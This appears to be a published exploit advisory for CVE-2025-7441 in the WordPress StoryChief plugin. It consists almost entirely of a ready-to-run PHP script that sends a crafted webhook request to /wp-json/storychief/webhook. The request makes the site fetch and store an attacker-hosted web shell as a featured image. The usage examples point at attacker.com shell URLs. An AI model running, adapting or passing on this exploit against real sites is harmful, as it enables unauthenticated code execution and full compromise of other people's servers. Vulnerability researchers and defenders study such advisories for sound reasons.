@@ -1,0 +1,490 @@
+=============================================================================================================================================
+| # Title     : WordPress StoryChief 1.0.42 Unauthenticated Remote Code Execution via Featured Image                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/story-chief/                                                                                  |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7441 
+
+                 https://packetstorm.news/files/id/210218/
+
+                 https://wpscan.com/vulnerability/12349
+
+[+] Summary
+   
+    A critical security vulnerability exists in the WordPress Story Chief plugin that allows unauthenticated attackers to achieve remote code execution by exploiting the webhook featured image functionality. 
+	The vulnerability enables attackers to inject and execute arbitrary PHP code through crafted POST requests.
+	
+	The vulnerability exists in the Story Chief plugin's webhook endpoint that handles post creation from external sources. 
+	The plugin fails to properly validate and sanitize featured image URLs, allowing attackers to:
+
+1. Bypass authentication via the webhook interface
+2. Inject malicious PHP files through featured image URLs
+3. Execute arbitrary code on the target server
+4. Achieve complete system compromise
+
+[+] Usage: 
+
+Usage: php poc.php -u https://example.com -shell http://attacker.com/shell.jpg
+
+[+] POC :
+
+<?php
+/**
+ * CVE-2025-7441 Exploit - Story Chief WordPress Plugin RCE
+ * By: indoushka
+ */
+
+class StoryChiefExploit {
+    private $debug = false;
+    
+    public function __construct($debug = false) {
+        $this->debug = $debug;
+    }
+    
+    private function log($message, $level = "INFO") {
+        echo "[$level] $message\n";
+    }
+    
+    private function debugLog($message) {
+        if ($this->debug) {
+            echo "[DEBUG] $message\n";
+        }
+    }
+    
+    public function parseArgs($argv) {
+        $options = [
+            'url' => '',
+            'shell' => '',
+            'key' => '',
+            'header' => [],
+            'timeout' => 15,
+            'retries' => 2,
+            'backoff' => 0.5,
+            'proxy' => '',
+            'no_verify' => false,
+            'print_only' => false,
+            'use_curl' => false,
+            'debug' => false,
+            'title' => 'Test post',
+            'excerpt' => ''
+        ];
+        
+        for ($i = 1; $i < count($argv); $i++) {
+            switch ($argv[$i]) {
+                case '-u':
+                case '--url':
+                    $options['url'] = $argv[++$i];
+                    break;
+                case '-shell':
+                    $options['shell'] = $argv[++$i];
+                    break;
+                case '-k':
+                case '--key':
+                    $options['key'] = $argv[++$i];
+                    break;
+                case '--header':
+                    $options['header'][] = $argv[++$i];
+                    break;
+                case '--timeout':
+                    $options['timeout'] = (int)$argv[++$i];
+                    break;
+                case '--retries':
+                    $options['retries'] = (int)$argv[++$i];
+                    break;
+                case '--backoff':
+                    $options['backoff'] = (float)$argv[++$i];
+                    break;
+                case '--proxy':
+                    $options['proxy'] = $argv[++$i];
+                    break;
+                case '--no-verify':
+                    $options['no_verify'] = true;
+                    break;
+                case '--print-only':
+                    $options['print_only'] = true;
+                    break;
+                case '--use-curl':
+                    $options['use_curl'] = true;
+                    break;
+                case '--debug':
+                    $options['debug'] = true;
+                    $this->debug = true;
+                    break;
+                case '--title':
+                    $options['title'] = $argv[++$i];
+                    break;
+                case '--excerpt':
+                    $options['excerpt'] = $argv[++$i];
+                    break;
+                case '--help':
+                    $this->showHelp();
+                    exit(0);
+            }
+        }
+        
+        if (empty($options['url']) || empty($options['shell'])) {
+            $this->log("Error: URL and shell parameters are required", "ERROR");
+            $this->showHelp();
+            exit(1);
+        }
+        
+        return $options;
+    }
+    
+    private function showHelp() {
+        echo "CVE-2025-7441 Exploit - Story Chief WordPress Plugin RCE\n";
+        echo "Usage: php exploit.php -u <url> -shell <shell_url> [options]\n\n";
+        echo "Options:\n";
+        echo "  -u, --url        Webhook URL or site root (required)\n";
+        echo "  -shell           Shell/image URL to include as featured image (required)\n";
+        echo "  -k, --key        Encryption key (hex). Leave empty for default\n";
+        echo "  --header         Custom header, format: Key:Value\n";
+        echo "  --timeout        Request timeout seconds (default: 15)\n";
+        echo "  --retries        Retry attempts on failure (default: 2)\n";
+        echo "  --backoff        Backoff factor between retries (default: 0.5)\n";
+        echo "  --proxy          HTTP/HTTPS proxy URL\n";
+        echo "  --no-verify      Disable SSL verification\n";
+        echo "  --print-only     Print payload only; do not send\n";
+        echo "  --use-curl       Force use of curl instead of file_get_contents\n";
+        echo "  --debug          Print debug info\n";
+        echo "  --title          Post title (default: Test post)\n";
+        echo "  --excerpt        Post excerpt\n";
+        echo "  --help           Show this help\n\n";
+        echo "Examples:\n";
+        echo "  php exploit.php -u https://example.com -shell http://attacker.com/shell.jpg\n";
+        echo "  php exploit.php -u https://example.com -shell http://attacker.com/shell.php --debug\n";
+    }
+    
+    private function normalizeWebhookUrl($url) {
+        $parsed = parse_url($url);
+        
+        if (empty($parsed['scheme']) || empty($parsed['host'])) {
+            throw new Exception("invalid_url");
+        }
+        
+        if (empty($parsed['path']) || $parsed['path'] === '/') {
+            $parsed['path'] = '/wp-json/storychief/webhook';
+        }
+        
+        $scheme = $parsed['scheme'];
+        $host = $parsed['host'];
+        $port = isset($parsed['port']) ? ':' . $parsed['port'] : '';
+        $path = $parsed['path'];
+        
+        return "$scheme://$host$port$path";
+    }
+    
+    private function validateShellUrl($shellUrl) {
+        $parsed = parse_url($shellUrl);
+        
+        if (empty($parsed['scheme']) || empty($parsed['host'])) {
+            throw new Exception("invalid_shell_url");
+        }
+        
+        return $parsed;
+    }
+    
+    private function extractFilename($shellParsed) {
+        $name = basename($shellParsed['path']);
+        if (empty($name)) {
+            $name = "shell.php";
+        }
+        return $name;
+    }
+    
+    private function checkShellUrl($shellUrl, $timeout) {
+        $context = stream_context_create([
+            'http' => ['timeout' => $timeout],
+            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
+        ]);
+        
+        // Try HEAD first
+        $headers = @get_headers($shellUrl, 0, $context);
+        if ($headers && strpos($headers[0], '200') !== false) {
+            $this->debugLog("shell HEAD status: 200");
+            return true;
+        }
+        
+        // Try GET if HEAD failed
+        $content = @file_get_contents($shellUrl, false, $context);
+        if ($content !== false) {
+            $this->debugLog("shell GET successful");
+            return true;
+        }
+        
+        // Fallback to curl if available
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $shellUrl,
+                CURLOPT_NOBODY => true,
+                CURLOPT_TIMEOUT => $timeout,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_FOLLOWLOCATION => true
+            ]);
+            
+            curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($httpCode === 200) {
+                $this->debugLog("shell CURL status: 200");
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    private function buildPayload($title, $shellUrl, $excerpt) {
+        return [
+            "meta" => ["event" => "publish"],
+            "data" => [
+                "title" => $title,
+                "excerpt" => $excerpt,
+                "featured_image" => [
+                    "data" => [
+                        "sizes" => ["full" => $shellUrl],
+                        "alt" => "demo shell"
+                    ]
+                ]
+            ]
+        ];
+    }
+    
+    private function signPayload($payload, $keyBytes) {
+        $signed = json_encode($payload, JSON_UNESCAPED_SLASHES);
+        $signed = str_replace('/', '\\/', $signed);
+        
+        if (empty($keyBytes)) {
+            $mac = hash('sha256', $signed);
+        } else {
+            $mac = hash_hmac('sha256', $signed, $keyBytes);
+        }
+        
+        $payload["meta"]["mac"] = $mac;
+        return array($signed, $mac);
+    }
+    
+    private function prepareHeaders($customHeaders) {
+        $headers = ["Content-Type: application/json"];
+        
+        foreach ($customHeaders as $header) {
+            if (strpos($header, ':') !== false) {
+                list($key, $value) = explode(':', $header, 2);
+                $headers[] = trim($key) . ': ' . trim($value);
+            }
+        }
+        
+        return $headers;
+    }
+    
+    private function sendWithFileGetContents($url, $payload, $headers, $timeout, $verify) {
+        $opts = [
+            'http' => [
+                'method' => 'POST',
+                'header' => implode("\r\n", $headers),
+                'content' => json_encode($payload),
+                'timeout' => $timeout,
+                'ignore_errors' => true
+            ]
+        ];
+        
+        if (!$verify) {
+            $opts['ssl'] = [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ];
+        }
+        
+        $context = stream_context_create($opts);
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return array('', 0, array());
+        }
+        
+        $statusCode = 200;
+        if (isset($http_response_header[0])) {
+            preg_match('/HTTP\/\d\.\d\s+(\d+)/', $http_response_header[0], $matches);
+            $statusCode = isset($matches[1]) ? (int)$matches[1] : 200;
+        }
+        
+        return array($response, $statusCode, $http_response_header);
+    }
+    
+    private function sendWithCurl($url, $payload, $headers, $timeout, $verify) {
+        $ch = curl_init();
+        
+        $curlHeaders = [];
+        foreach ($headers as $header) {
+            $curlHeaders[] = $header;
+        }
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => json_encode($payload),
+            CURLOPT_HTTPHEADER => $curlHeaders,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => $verify,
+            CURLOPT_SSL_VERIFYHOST => $verify ? 2 : 0,
+            CURLOPT_FOLLOWLOCATION => true
+        ]);
+        
+        $response = curl_exec($ch);
+        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return array($response, $statusCode, array());
+    }
+    
+    private function handleResponseText($outText, $targetUrl) {
+        $out = trim($outText);
+        
+        if (empty($out) || strpos($out, '<') === 0) {
+            return array(false, null);
+        }
+        
+        $json = json_decode($out, true);
+        if (json_last_error() !== JSON_ERROR_NONE) {
+            return array(false, null);
+        }
+        
+        // Search for permalink in response
+        $permalink = $this->findFirstKey($json, array("permalink", "permalink_url", "link", "url"));
+        if ($permalink) {
+            return array(true, $permalink);
+        }
+        
+        // Search for post ID
+        $idVal = $this->findFirstKey($json, array("id", "post_id"));
+        if ($idVal && (is_int($idVal) || is_numeric($idVal))) {
+            $pid = (int)$idVal;
+            $preview = $targetUrl . "/?p=$pid&preview=true";
+            return array(true, $preview);
+        }
+        
+        return array(true, null);
+    }
+    
+    private function findFirstKey($obj, $names) {
+        if (is_array($obj)) {
+            foreach ($obj as $k => $v) {
+                if (in_array($k, $names) && is_string($v)) {
+                    return $v;
+                }
+                
+                if (is_array($v)) {
+                    $res = $this->findFirstKey($v, $names);
+                    if ($res !== null) {
+                        return $res;
+                    }
+                }
+            }
+        }
+        
+        return null;
+    }
+    
+    public function execute($args) {
+        try {
+            $key = empty($args['key']) ? '' : hex2bin($args['key']);
+            if ($key === false) {
+                $this->log("Error: invalid key", "ERROR");
+                return 1;
+            }
+        } catch (Exception $e) {
+            $this->log("Error: invalid key format", "ERROR");
+            return 1;
+        }
+        
+        try {
+            $targetUrl = $this->normalizeWebhookUrl($args['url']);
+        } catch (Exception $e) {
+            $this->log("Error: invalid URL", "ERROR");
+            return 1;
+        }
+        
+        try {
+            $shellParsed = $this->validateShellUrl($args['shell']);
+        } catch (Exception $e) {
+            $this->log("Error: invalid shell URL", "ERROR");
+            return 1;
+        }
+        
+        $filename = $this->extractFilename($shellParsed);
+        $shellOk = $this->checkShellUrl($args['shell'], $args['timeout']);
+        
+        if (!$shellOk) {
+            $this->log("Error: shell URL is not reachable (not HTTP 200)", "ERROR");
+            return 1;
+        }
+        
+        $payload = $this->buildPayload($args['title'], $args['shell'], $args['excerpt']);
+        list($signed, $mac) = $this->signPayload($payload, $key);
+        $headers = $this->prepareHeaders($args['header']);
+        
+        if ($args['print_only']) {
+            if ($this->debug) {
+                $this->debugLog("payload: " . json_encode($payload, JSON_PRETTY_PRINT));
+            }
+            echo json_encode($payload, JSON_PRETTY_UNICODE | JSON_PRETTY_PRINT) . "\n";
+            return 0;
+        }
+        
+        $verify = !$args['no_verify'];
+        
+        try {
+            if (function_exists('curl_init') && $args['use_curl']) {
+                list($outText, $statusCode, $respHeaders) = $this->sendWithCurl($targetUrl, $payload, $headers, $args['timeout'], $verify);
+            } else {
+                list($outText, $statusCode, $respHeaders) = $this->sendWithFileGetContents($targetUrl, $payload, $headers, $args['timeout'], $verify);
+            }
+        } catch (Exception $e) {
+            $this->debugLog("send error: " . $e->getMessage());
+            $this->log("Error: request failed", "ERROR");
+            return 1;
+        }
+        
+        list($ok, $link) = $this->handleResponseText($outText, $args['url']);
+        
+        if ($ok) {
+            $ym = date('Y/m');
+            $path = "wp-content/uploads/$ym/$filename";
+            $this->log("Uploaded: $path", "SUCCESS");
+            
+            if ($link) {
+                $this->log("Post URL: $link", "INFO");
+            }
+            
+            return 0;
+        } else {
+            if ($this->debug) {
+                $this->debugLog("server response: " . substr($outText, 0, 1000));
+            }
+            $this->log("Error: upload failed or endpoint returned non-JSON/HTML", "ERROR");
+            return 1;
+        }
+    }
+}
+
+// Main execution
+if (php_sapi_name() === 'cli') {
+    $exploit = new StoryChiefExploit();
+    $args = $exploit->parseArgs($argv);
+    exit($exploit->execute($args));
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
